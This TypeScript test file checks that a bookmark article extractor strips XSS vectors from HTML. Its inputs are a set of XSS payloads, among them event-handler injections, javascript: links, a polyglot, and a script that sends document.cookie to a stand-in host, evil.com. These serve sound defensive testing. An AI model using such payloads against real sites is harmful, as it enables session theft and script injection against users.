/**
 * Malicious HTML sanitization tests
 * Tests that HTML content from bookmarks is properly sanitized to prevent XSS
 * and other HTML-based attacks during article extraction.
 */

import { describe, test, expect } from 'vitest';
import { ArticleExtractor } from '../../src/bookmark-enrichment/article-extractor.js';

// Helper function to wrap HTML in proper document structure for Readability.js
function wrapInDocument(htmlContent: string): string {
    return `<!DOCTYPE html><html><head><title>Test Article</title></head><body><article>${htmlContent}</article></body></html>`;
}

describe('Malicious HTML Sanitization', () => {
    const maliciousHTMLCases = [
        {
            name: 'script tag',
            html: '<p>Safe content</p><script>alert("xss")</script>',
            shouldNotContain: ['<script>', 'alert'],
        },
        {
            name: 'iframe with external source',
            html: '<p>Content</p><iframe src="http://evil.com"></iframe>',
            shouldNotContain: ['<iframe', 'evil.com'],
        },
        {
            name: 'img with onerror',
            html: '<p>Content</p><img src=x onerror="alert(1)">',
            shouldNotContain: ['onerror', 'alert(1)'],
        },
        {
            name: 'svg with onload',
            html: '<p>Content</p><svg onload="alert(1)"><rect width="100" height="100"/></svg>',
            shouldNotContain: ['onload', 'alert'],
        },
        {
            name: 'javascript protocol',
            html: '<p>Content</p><a href="javascript:evil()">Link</a>',
            shouldNotContain: ['javascript:', 'evil()'],
        },
        {
            name: 'style tag with import',
            html: '<p>Content</p><style>@import "evil.css";</style>',
            shouldNotContain: ['<style', '@import', 'evil.css'],
        },
        {
            name: 'meta refresh redirect',
            html: '<p>Content</p><meta http-equiv="refresh" content="0;url=http://evil.com">',
            shouldNotContain: ['<meta', 'http-equiv', 'evil.com'],
        },
        {
            name: 'noscript tag',
            html: '<p>Content</p><noscript>Javascript required</noscript>',
            shouldNotContain: ['<noscript'],
        },
        {
            name: 'object tag',
            html: '<p>Content</p><object data="evil.swf"></object>',
            shouldNotContain: ['<object', 'evil.swf'],
        },
        {
            name: 'embed tag',
            html: '<p>Content</p><embed src="evil.swf">',
            shouldNotContain: ['<embed', 'evil.swf'],
        },
        {
            name: 'form with action',
            html: '<p>Content</p><form action="http://evil.com"><input type="submit"></form>',
            shouldNotContain: ['<form', 'evil.com'],
        },
        {
            name: 'input with autofocus',
            html: '<p>Content</p><input autofocus onfocus="alert(1)">',
            shouldNotContain: ['autofocus', 'onfocus'],
        },
        {
            name: 'details with open toggle',
            html: '<p>Content</p><details open ontoggle="alert(1)"><summary>Click me</summary></details>',
            shouldNotContain: ['ontoggle', 'alert'],
        },
        {
            name: 'video with poster',
            html: '<p>Content</p><video poster="data:image/svg+xml,<svg onload=alert(1)>"></video>',
            shouldNotContain: ['poster', 'onload'],
        },
        {
            name: 'multiple event handlers',
            html: '<p>Content</p><div onclick="bad()" onmouseover="worse()" ondblclick="worst()">text</div>',
            shouldNotContain: ['onclick', 'onmouseover', 'ondblclick'],
        },
    ];

    describe('ArticleExtractor extracts safely', () => {
        test.each(maliciousHTMLCases)('neutralizes: $name', ({ html, shouldNotContain }) => {
            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();

            // Check that markdown output doesn't contain malicious patterns
            for (const pattern of shouldNotContain) {
                expect(result!.content).not.toContain(pattern);
            }
        });

        test('preserves safe HTML content', () => {
            const safeHTML = `
                <html>
                <head><title>Safe Article</title></head>
                <body>
                    <h1>Article Title</h1>
                    <p>This is a <strong>safe</strong> paragraph with <em>formatting</em>.</p>
                    <ul>
                        <li>Item 1</li>
                        <li>Item 2</li>
                    </ul>
                    <blockquote>A safe quote</blockquote>
                    <code>const x = 42;</code>
                    <img src="https://example.com/image.jpg" alt="Safe image">
                </body>
                </html>
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(safeHTML, 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).toContain('Article Title');
            expect(result!.content).toContain('safe');
            expect(result!.content).toContain('formatting');
            expect(result!.content).toContain('Item 1');
            expect(result!.content).toContain('A safe quote');
            expect(result!.content).toContain('const x = 42;');
            expect(result!.content).toContain('![Safe image]');
        });

        test('removes script tags but keeps surrounding content', () => {
            const html = `
                <h1>Before</h1>
                <p>Paragraph before</p>
                <script>alert("xss")</script>
                <p>Paragraph after</p>
                <h2>After</h2>
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).toContain('Before');
            expect(result!.content).toContain('After');
            expect(result!.content).toContain('Paragraph before');
            expect(result!.content).toContain('Paragraph after');
            expect(result!.content).not.toContain('<script>');
            expect(result!.content).not.toContain('alert');
        });

        test('handles multiple script blocks', () => {
            const html = `
                <p>Content 1</p>
                <script>evil1()</script>
                <p>Content 2</p>
                <script>evil2()</script>
                <p>Content 3</p>
                <script src="evil.js"></script>
                <p>Content 4</p>
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).toContain('Content 1');
            expect(result!.content).toContain('Content 2');
            expect(result!.content).toContain('Content 3');
            expect(result!.content).toContain('Content 4');
            expect(result!.content).not.toContain('evil1');
            expect(result!.content).not.toContain('evil2');
            expect(result!.content).not.toContain('evil.js');
        });

        test('handles inline event handlers on various elements', () => {
            const html = `
                <p>Content</p>
                <div onclick="bad()">text</div>
                <span onmouseover="worse()">text</span>
                <a onmouseenter="worst()">link</a>
                <b onmouseleave="badfunction()">bold</b>
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).not.toContain('onclick');
            expect(result!.content).not.toContain('onmouseover');
            expect(result!.content).not.toContain('onmouseenter');
            expect(result!.content).not.toContain('onmouseleave');
            expect(result!.content).not.toContain('bad()');
            expect(result!.content).not.toContain('worse()');
            expect(result!.content).not.toContain('worst()');
        });

        test('handles data URLs with SVG XSS', () => {
            const html = `
                <p>Content</p>
                <img src="data:image/svg+xml,<svg onload=alert(1)>">
                <iframe src="data:text/html,<script>alert(1)</script>"></iframe>
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            // iframe should be removed entirely
            expect(result!.content).not.toContain('iframe');
            expect(result!.content).not.toContain('data:text/html');
        });
    });

    describe('Markdown output safety', () => {
        test('markdown output does not contain executable JavaScript', () => {
            const html = '<p>Safe</p><script>alert(1)</script>';
            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).not.toMatch(/javascript:/i);
            expect(result!.content).not.toMatch(/on\w+\s*=/i); // Matches onclick, onerror, etc.
        });

        test('markdown output does not contain dangerous HTML tags', () => {
            const html = `
                <p>Content</p>
                <script>alert(1)</script>
                <iframe src="evil.com"></iframe>
                <object data="evil.swf"></object>
                <embed src="evil.swf">
                <style>@import "evil.css"</style>
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).not.toContain('<script');
            expect(result!.content).not.toContain('<iframe');
            expect(result!.content).not.toContain('<object');
            expect(result!.content).not.toContain('<embed');
            expect(result!.content).not.toContain('<style');
        });

        test('markdown output is XSS-safe when rendered', () => {
            const xssPayloads = [
                '<script>alert("xss")</script>',
                '<img src=x onerror="alert(1)">',
                '<svg onload="alert(1)">',
                '<iframe src="javascript:alert(1)"></iframe>',
                '<a href="javascript:alert(1)">click</a>',
                '<style>@import "evil.css"</style>',
                '<meta http-equiv="refresh" content="0;url=evil.com">',
            ];

            const extractor = new ArticleExtractor();

            for (const payload of xssPayloads) {
                const html = `<h1>Title</h1><p>${payload}</p>`;
                const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

                expect(result).not.toBeNull();
                // The rendered markdown should not contain executable code
                expect(result!.content).not.toContain('javascript:');
                expect(result!.content).not.toMatch(/on\w+\s*=/i);
            }

            // Test plain text "javascript:alert(1)" separately
            // This is text content, not an XSS attack, so it's preserved
            const plainTextHtml = '<h1>Title</h1><p>javascript:alert(1)</p>';
            const plainTextResult = extractor.extractFromHtml(wrapInDocument(plainTextHtml), 'https://example.com');
            expect(plainTextResult).not.toBeNull();
            // Plain text is preserved, but it's not executable in markdown context
            expect(plainTextResult!.content).toContain('javascript:');
            // However, no event handlers should be present
            expect(plainTextResult!.content).not.toMatch(/on\w+\s*=/i);
        });
    });

    describe('Edge cases', () => {
        test('handles malformed HTML', () => {
            const malformedHTML = `
                <p>Content
                <script>alert("unclosed")
                <p>More content
                <img src=x onerror="alert(1)"
                <div onclick="bad()">text
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(malformedHTML), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).not.toMatch(/on\w+\s*=/i);
        });

        test('handles unicode in malicious content', () => {
            const html = '<p>Safe 世界 🌍</p><script>alert("XSS")</script><p>More 測試 content</p><img src=x onerror="alert(1)">';
            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).toContain('世界');
            expect(result!.content).toContain('🌍');
            expect(result!.content).toContain('測試');
            expect(result!.content).not.toContain('<script');
            expect(result!.content).not.toMatch(/on\w+\s*=/i);
        });

        test('handles very long malicious content', () => {
            const longScript = '<script>' + 'a'.repeat(100000) + '</script>';
            const html = `<h1>Title</h1><p>Content</p>${longScript}`;
            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).not.toContain('<script');
            expect(result!.content).not.toContain('a'.repeat(1000)); // Script should be removed
        });

        test('handles nested malicious elements', () => {
            const html = `
                <div>
                    <p>Safe content</p>
                    <div>
                        <span>
                            <script>alert("nested")</script>
                        </span>
                    </div>
                </div>
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).toContain('Safe content');
            expect(result!.content).not.toContain('<script');
            expect(result!.content).not.toContain('alert');
        });
    });

    describe('Real-world attack patterns', () => {
        test('handles reflected XSS pattern', () => {
            const html = `
                <h1>Article Title</h1>
                <p>Search results for: <script>document.location='http://evil.com/?'+document.cookie</script></p>
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).not.toContain('document.location');
            expect(result!.content).not.toContain('document.cookie');
            expect(result!.content).not.toContain('<script');
        });

        test('handles DOM-based XSS pattern', () => {
            const html = `
                <h1>Article</h1>
                <p>Some text content here to make Readability extract this.</p>
                <div id="content">
                    <span>Text content</span>
                    <img src=x onerror="setTimeout(function(){alert(1)})">
                </div>
                <p>More content here.</p>
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).not.toContain('setTimeout');
            expect(result!.content).not.toMatch(/on\w+\s*=/i);
        });

        test('handles polyglot XSS', () => {
            // Polyglot XSS that works in multiple contexts
            const html = `
                <p>Content</p>
                <img src=x onerror="javascript:/*<script><!--*/alert(1)//--></script>">
            `;

            const extractor = new ArticleExtractor();
            const result = extractor.extractFromHtml(wrapInDocument(html), 'https://example.com');

            expect(result).not.toBeNull();
            expect(result!.content).not.toContain('javascript:');
            expect(result!.content).not.toContain('<script');
            expect(result!.content).not.toMatch(/on\w+\s*=/i);
        });
    });
});
